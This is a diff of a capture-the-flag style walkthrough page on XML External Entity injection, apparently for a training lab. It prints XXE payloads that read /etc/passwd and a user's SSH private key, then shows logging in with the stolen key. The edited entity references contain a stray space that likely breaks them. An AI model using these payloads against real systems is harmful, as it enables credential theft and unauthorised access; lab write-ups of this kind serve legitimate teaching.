@@ -197,15 +197,15 @@ MAC Address: 02:92:AB:C9:74:07 (Unknown)
 
 Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}
 
-Use `firefox` to load url `http://<ip>` and try the below payloads. Use `&` in place of `&amp;`.
+Use `firefox` to load url `http://<ip>` and try the below payloads.
 {% capture code %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
   <userInfo>
     <firstName>falcon</firstName>
-    <lastName>&amp;name;</lastName>
+    <lastName>&name ;</lastName>
   </userInfo>{% endcapture %} {% include code.html code=code%}
 
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code %}
+<root>&read ;</root>{% endcapture %} {% include code.html code=code %}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
@@ -214,13 +214,13 @@ The first payload will display `falcon feast` and the second payload will displa
 
 Use `firefox` to load the url `http://<ip>`.
 
-Use the following payloads to get the contents of `/etc/passwd`. Use `&` in place of `&amp;`.
+Use the following payloads to get the contents of `/etc/passwd`.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code %}
+<root>&read ;</root>{% endcapture %} {% include code.html code=code %}
 
-There is one non-system user. Use the following payload to read the user's rsa private key. Use `&` in place of `&amp;`.
+There is one non-system user. Use the following payload to read the user's rsa private key.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code %}
+<root>&read ;</root>{% endcapture %} {% include code.html code=code %}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
